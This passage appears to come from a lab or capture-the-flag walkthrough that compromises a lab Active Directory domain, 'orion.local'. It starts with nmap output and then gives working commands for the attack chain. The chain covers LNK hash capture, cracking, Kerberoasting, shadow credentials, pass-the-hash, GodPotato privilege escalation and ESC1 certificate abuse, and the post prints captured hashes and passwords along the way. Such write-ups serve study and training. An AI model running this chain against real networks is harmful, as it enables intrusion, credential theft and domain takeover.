| bG9jYWw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQWUEyrJTsHEC8
| VXhwZm3iUIIQREMwMS5vcmlvbi5sb2NhbDBOBgkrBgEEAYI3GQIEQTA/oD0GCisG
| AQQBgjcZAgGgLwQtUy0xLTUtMjEtMjg1MDM3NTI0LTM4MDA3NTg1ODctMzY0MTQz
| OTc5Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQAdqxYrPR2cixMj4ADcEoY5SShK
| JYF8AjU46vMHACQeuEH/q+PkRbZwV5fd67O76LGk9IxPSFRvjnuXBfb9kTEp1zeF
| 58qnP26CCnY1FBxkzxD56m879jI327wQns+ybEM3NjAyHlL2ygrFYtJ5giAS/i2/
| pg6RfKBXj8w7D5hh75+1Rt53U7JrdlXhTl/XMrAveJKgRo1lUFv3uUGRGA/6LAwB
| nSp2GGyQR3iDFJT3edgyJwhCrtSFMafOV4hRx4mLNXAXdp4U4aBJ9/Tm/G9eRvLK
| w13O76EY2DrDiQjoea8i/qVOMHsHac3LL07jot22W0CCtqIkj4MUMuLbTiMy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.orion.local
| Issuer: commonName=DC01.orion.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-02T15:11:15
| Not valid after:  2027-04-03T15:11:15
| MD5:     9d39 8b55 1e05 1f19 e69d b919 3911 c884
| SHA-1:   20e9 65f8 6898 b42d 5c56 7903 9eb9 6508 317e 60d0
| SHA-256: 468f 41fd a1ef 7857 a684 9375 ccf7 dd21 9e97 04e8 ba12 76b6 e666 1400 27ff c502
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQYPd6v+bHRKxDn9kbWBb4IzANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBEQzAxLm9yaW9uLmxvY2FsMB4XDTI2MTAwMjE1MTExNVoXDTI3
| MDQwMzE1MTExNVowGzEZMBcGA1UEAxMQREMwMS5vcmlvbi5sb2NhbDCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKHs4GWoPmcorZYxmXFuBS8LUXcGkRrU
| ryUgIwjSnV18H+3hRm+orG9rXwxaKtzeQlWk2++1V7pX9V+zHkv9FqnbnTEGRgkF
| m1MhwFEjkeiqiZuuKQDGXbZdGExm5GdHkhIZTpgAPdGyFw6B/4qIi3jrf57FVXEb
| NO7znrVnNeS2yUVldp0pbVMIgXrjDrAFkfRD3VSzjuBAsQLNCPPpnQWGeoUM0gVn
| P1SAKbrhwac+ZMbDeKERnDWBjycr5AYOBk3uAcKDb4/dYWvszXMLfO9hqnv7SXoO
| myyO9yEmHyIZKTXlIgcJOzWGNjnHNWH+TSEnwVjkdfkCMIDaPuKeSDUCAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQCee6VQD9WkZn4wAcA/vixb8CMkiCU0XdR3x/LD4YYH6QKzi3+AxPZO
| V3/YDaCTFgh+puE5LD71OZlms/G4Ftf+H+EXYNVQ/JSaeKdn8sVFp/oo6lpaL3qu
| DgsafM5UiDsIr6qB+ItiDIZj8gZK6oirMNs1y6MT3I4WjCia0PwYSQq02v4ya+2J
| 5+MfrHTTzPq7Zo1bm5wk7yAbOAApml394T92JDJS0PWg5knQ3RtiS/CQMg9h8kZz
| bTFrakKsfw8JWtm8vO0W9VdWtySxrtXh4NsQfoTzaMLR+wWXbSmxqkAv2vg/qfrd
| T/owA8kx3/pMUOuJrA8WxH56xF9GM0QH
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: ORION
|   NetBIOS_Domain_Name: ORION
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: orion.local
|   DNS_Computer_Name: DC01.orion.local
|   DNS_Tree_Name: orion.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-10-15T15:40:53+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49726/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49819/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=10/15%Time=6AD0F39A%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=10/15%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6AD0F3FC%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10E%TI=I%TS=A)
SEQ(SP=FF%GCD=1%ISR=107%TI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.034 days (since Thu Oct 15 10:51:17 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-15T15:40:53
|_  start_date: N/A
|_clock-skew: mean: 50s, deviation: 0s, median: 50s
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 0e:ff:f3:c2:93:1f (unknown)
| Names:
|   DC01<00>             Flags: <unique><active>
|   ORION<00>            Flags: <group><active>
|   ORION<1c>            Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|   ORION<1b>            Flags: <unique><active>
| Statistics:
|   0e ff f3 c2 93 1f 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29191/tcp): CLEAN (Timeout)
|   Check 2 (port 38129/tcp): CLEAN (Timeout)
|   Check 3 (port 41192/udp): CLEAN (Timeout)
|   Check 4 (port 28756/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   89.75 ms 192.168.211.1
2   90.26 ms DC01.orion.local (10.0.0.5)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:40
Completed NSE at 11:40, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.06 seconds
           Raw packets sent: 118 (9.500KB) | Rcvd: 53 (2.828KB)
```


#### Moving Forward


Let's try a guest enumeration the SMB share of the IT-Workstation computer. 

![](orion-03.png)


Notable Shares on the workstation - `IT`, `Company`, and `Uploads`.

Let's check out the Uploads folder.

![](orion-04.png)

Let's read the README.txt

![](orion-05.png)

Let's place a malicious `LNK` or `INK` .. idk lol.

I know there is a module called `slinky` to help with this.


![](orion-06.png)

Oops b.williams.. bad idea..

```
b.williams::ORION:7478162f51fcc71a:8EE35B797A6B79F9252AB383CF4D4404:01010000000000008023074FCA5CDD01D6A43923C1A515480000000002000800360039005700450001001E00570049004E002D005900570045005A00440047004A00560057005900350004003400570049004E002D005900570045005A00440047004A0056005700590035002E0036003900570045002E004C004F00430041004C000300140036003900570045002E004C004F00430041004C000500140036003900570045002E004C004F00430041004C00070008008023074FCA5CDD01060004000200000008003000300000000000000000000000002000007F901D6CEF9B974CF57E1FCE5E8155A8ACF169C5ECDDEEE0DDB48D4C25E7E66F0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

First thing I want to try and do is crack the hash.

Let's make this a file and crack it.

![](orion-07.png)

Really? williams123? Not a good password.. ;).

![](orion-08.png)

Let's check out the `Company` share now that we have another share we can Read!

```
nxc smb WS-IT.orion.local -u 'b.williams' -p 'williams123' -M spider_plus -o DOWNLOAD_FLAG=True
```

![](orion-09.png)

See two different files here.

![](orion-10.png)

![](orion-11.png)

Nothing particularly interesting about these files except for the fact that they have some potential new targetable areas..

`hr@orion.local` and `logistics@orion.local` 

I believe we have the ability to WinRM and RDP into the WS-IT machine, so let's check out the privileges of this user and see where it goes from there.

![](orion-12.png)

Was hanging here for quite some time so I don't think we can WinRM. Let;'s try to use `remmina`.

Nothing there either? Hm.

Let's see if we can enumerate the DC with our credentials maybe?

![](orion-13.png)

Awesome, we got a ton of users over here.

```
Administrator
Guest
krbtgt
b.williams
j.carter
s.mitchell
d.brooks
m.reeves
svc-pki
m.white
svc-onboarding
d.miller
```

Some interesting svc accounts that might be nice.

I mean, we might as well Bloodhound, right?


![](orion-14.png)

Bloodhound data collected.

```
nxc ldap DC01.orion.local -u 'b.williams' -p 'williams123' --bloodhound --collection All --dns-server 10.0.0.5
```


![](orion-15.png)

Personally, this is how I start my Bloodhound!

![](orion-16.png)

If you have any Bloodhound Data, let's clear it out first. Go to `Administration` then `Database Management` and `Delete graph data` if you don't need it anymore.

![](orion-17.png)


![](orion-18.png)

Here's our user, don't see anything that stands out too much.

![](orion-19.png)

Looks like the default `Administrator` is our only Domain Admin. I used the Cypher Query of `All Domain admins`.

![](orion-20.png)

Perfect, a `Kerberoastable` user!!

`svc-onboarding`

![](orion-21.png)

This user is a part of `HelpDeskOPS`. 

![](orion-22.png)

HelpDeskOps has `ForceChangePassword` on a few users here. 

`J.Carter`, `S.Mitchell` and `D.Brooks`. 

![](orion-23.png)

This `S.Mitchell` user seems to be a part of the `HelpDeskOPSTier2` group, who appears to have `GenericWrite` over two other users, `D.Miller` and `M.White`.

![](orion-24.png)

These users have potential `Remote Access` to the WS-IT workstation that we were originally enumerating. Alright, let's create an attack path..

```
svc-onboarding -> s.mitchell -> m.white or m.reeves -> access to the WS-IT workstation -> Privilege Escalation on the machine?
```

Further Description from the WS-IT-RemoteAccess Group.

![](orion-25.png)

Let's do this..

![](orion-26.png)

Let's see if we can just save and crack this hash offline here.

![](orion-27.png)

Hmm, nothing with rockyou. Maybe we try some rules? 

Oh oops, had to specify the hash type.

```
hashcat -m 13100 -a0 output.txt /usr/share/wordlists/rockyou.txt
```

![](orion-28.png)

`svc-onboarding:password2510`

Sweet.

![](orion-29.png)

I've actually used this before so let's try to change s.mitchell's password from here.

![](orion-30.png)

Awesome.

Let's go back up and change both m.white and m.reeves because they might have some different privileges on the machine.

![](orion-31.png)

Interesting we are getting blocked here.

Let's go back to BloodHound and see if I missed something.

![](orion-32.png)

I got this error which I have never seen.

Also, since she is a part of a group that has GenericWrite, I wonder if I have to somehow write on behalf of the group. Never done that before.

Let's try a Shadow Credentials attack I guess!

![](orion-33.png)

I don't really like to use this one in BloodHound.

![](orion-34.png)

```
certipy-ad shadow auto -u 's.mitchell@orion.local' -p 'Password123' -account 'm.reeves' -dc-ip 10.0.0.5
```
M.reeves didn't work, let's try the other person.

```
certipy-ad shadow auto -u 's.mitchell@orion.local' -p 'Password123' -account 'm.reeves' -dc-ip 10.0.0.5
```

![](orion-35.png)

Alright, nice!

`m.white@orion.local:1b4f4e8d871ad063ffded46cc620bbf6`

I believe we can PTH here for Remote Access.

```
evil-winrm -i WS-IT.orion.local -u 'm.white' -H '1b4f4e8d871ad063ffded46cc620bbf6'
```

![](orion-36.png)

Great we made it in!

![](orion-37.png)


![](orion-38.png)

Oh nooo.

![](orion-39.png)

Just to make sure, I tried a PTH on SMB to see if I can read any shares.

First thing I like to check is the privs. Nothing interesting there.
![](orion-40.png)

Let's check the PowerShell History because I ran out of things to try.

```
type "C:/Users/m.white/APPDATA/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
```
![](orion-41.png)

Oh nice some creds!

`m.reeves:Pa$$word!123`

Checking the IT shares I see something interesting `ntrights.exe`

![](orion-42.png)

![](orion-43.png)

Ok.. nice. Maybe we can backup local system files and get the Admin hashes?

![](orion-44.png)

I ended up just seeing that this account already had ImpersonatePrivileges.

I thought about using `GodPotato` here.

So I created a backup user and made them an admin using thing command.

```
`GodPotato-NET4.exe -cmd "cmd.exe /c net user backup Pass123! /add && net localgroup administrators backup /add"`
```


![](orion-45.png)


Perfect we got a local Admin. 

Mimikatz time!

I'm going to make sure to get the write binary this time.. you will get errors if not.

I got errors. I don't think this is the way forward.

Let's check the rest of the shares.

![](orion-46.png)

Oh there we go, some user credentials inside the notepad file.

`svc-pki:Pki@Orion2026!`

![](orion-47.png)

Checking BloodHound we see that this user is in the Certificate Enrollers!

Let's check with certipy!

```
certipy-ad find -u 'svc-pki@orion.local' -p 'Pki@Orion2026!' -dc-ip 10.0.0.5 -target DC01.orion.local
```


Oh nice..

![](orion-48.png)

![](orion-49.png)

Looks like we might be able to make ourselves an Admin on the DC with this template.

It's an `ESC1` vulnerability, which I had to lookup.

certipy req \
    -u 'svc-pki@orion.local' -p 'Pki@Orion2026!' \
    -dc-ip '10.0.0.5' -target 'orion.local' \
    -ca 'orion-DC01-CA' -template 'OrionAuth' \
    -upn 'administrator@orion.local' -sid 'S-1-5-21-285037524-3800758587-3641439792-512'

I have to find the SID for the Admin which I believe is in the BloodHound data.

![](orion-50.png)

For some reason I couldn't write an `administrator.pfx` file so I had to sudo?

HUH?

![](orion-51.png)

Oh I copy and pasted the wrong SID..

```
S-1-5-21-285037524-3800758587-3641439792-500
```

That was the right one.

![](orion-52.png)

Nice! There we go.

`administrator@orion.local:aad3b435b51404eeaad3b435b51404ee:54c9fa5ad8849c9414602fe021314d49`

Let's try an evil-winrm.

```
evil-winrm -i DC01.orion.local -u 'ORION\administrator' -p 'aad3b435b51404eeaad3b435b51404ee:54c9fa5ad8849c9414602fe021314d49'
```

BOOM!

![](orion-53.png)


And we finished!

